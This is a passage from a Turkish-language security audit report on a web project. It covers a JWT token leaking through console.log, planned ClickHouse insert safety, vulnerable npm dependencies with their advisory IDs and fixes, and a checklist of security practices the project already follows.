### [ORTA-9] `AuthCallbackPage.jsx` SSO Token ve Kullanıcı `console.log` ile Loglanıyor

- **Zafiyet Türü:** CWE-532 — Insertion of Sensitive Information into Log File
- **OWASP:** A09 - Security Logging and Monitoring Failures
- **Konum:** `frontend/src/pages/AuthCallbackPage.jsx` → Satır 45-49 · `LogTimeModal.jsx` → Satır 120
- **Şiddet:** 🟡 Orta

**Tespit:**
```javascript
console.log("SSO RESPONSE DATA:", data)
console.log("Extracted Token:", access_token)  // ← JWT açıkça loglanıyor
console.log("Extracted User:", user)
```

**Çözüm:**
```javascript
// Tüm DEBUG console.log kaldırılmalı.
// vite.config.js'te production'da otomatik temizle:
build: {
    terserOptions: { compress: { drop_console: true } }
}
```

---

### [ORTA-10] ClickHouse Entegrasyonu Mevcut Değil — Güvenlik Değerlendirilemedi

- **Zafiyet Türü:** CWE-1059 — Missing Security Control Assessment
- **OWASP:** API9 - Improper Inventory Management
- **Konum:** Proje geneli — ClickHouse dosyası bulunamadı
- **Şiddet:** 🟡 Orta

**Öneri:** Entegrasyon eklendiğinde zorunlu kontroller:
```python
# Parametreli insert kullanın — string concatenation değil:
client.execute(
    'INSERT INTO work_log_events (...) VALUES',
    [event.model_dump()]  # Dict olarak geç
)
# Tüm gelen veriler UUID/Decimal tipiyle Pydantic'te doğrulanmalı
```

---

## 🔵 DÜŞÜK Bulgular

---

### [DÜŞÜK-5] `minimatch` ve `ajv` — ReDoS Açıkları (Dev Bağımlılığı Zinciri)

- **Zafiyet Türü:** CWE-1333 — ReDoS
- **OWASP:** A06 - Vulnerable and Outdated Components
- **Konum:** `frontend/node_modules/minimatch`, `node_modules/ajv`
- **Şiddet:** 🔵 Düşük (yalnızca build araçları etkileniyor)

**Çözüm:** `npm audit fix`

---

### [DÜŞÜK-6] `esbuild` Dev Server Cross-Origin İstek Kabul Ediyor (GHSA-67mh-4wv8-2f99)

- **Zafiyet Türü:** CWE-346 — Origin Validation Error
- **OWASP:** A05 - Security Misconfiguration
- **Konum:** `frontend/node_modules/esbuild`
- **Şiddet:** 🔵 Düşük (yalnızca development)

**Çözüm:** `npm install vite@7.x --save-dev`

---

## 📦 Bağımlılık Denetimi Özeti (npm audit)

| Paket | Versiyon | Şiddet | GHSA | Tür |
|---|---|---|---|---|
| `axios` | 1.6.5 | 🟠 Yüksek (7.5) | GHSA-43fc-jf86-j433 | Doğrudan |
| `rollup` | 4.x | 🟠 Yüksek | GHSA-mw96-cpmx-2vgc | Vite zinciri |
| `minimatch` | <=3.1.3 | 🟠 Yüksek (7.5) | GHSA-3ppc-4f35-3m26 | Dev zinciri |
| `esbuild` | <=0.24.2 | 🟡 Orta (5.3) | GHSA-67mh-4wv8-2f99 | Vite zinciri |
| `lodash` | 4.0-4.17.21 | 🟡 Orta (6.5) | GHSA-xxjr-mmjv-4gpg | Dev zinciri |
| `ajv` | <6.14.0 | 🟡 Orta | GHSA-2g4f-4pwh-qvx6 | Dev zinciri |

---

## ✅ Olumlu Güvenlik Pratikleri

| Kontrol | Değerlendirme |
|---|---|
| `require_admin` dependency tüm CRUD write'larında | ✅ |
| Work log sahiplik kontrolü (read/update/delete) | ✅ |
| Şifre bcrypt ile hash'leniyor | ✅ |
| Token `exp` claim içeriyor | ✅ |
| Global Exception Handler tüm servislerde | ✅ |
| Pydantic field validation | ✅ |
| SQLAlchemy ORM (ham sorgu yok) | ✅ |
| ClusterIP — servisler dışa kapalı | ✅ |
| Resource limits tüm Deployment'larda | ✅ |
| Multi-stage Docker build | ✅ |
| Namespace izolasyonu (hermes / hermes-test) | ✅ |
| `dangerouslySetInnerHTML` kullanımı yok | ✅ |
| Frontend ProtectedRoute + adminOnly | ✅ |
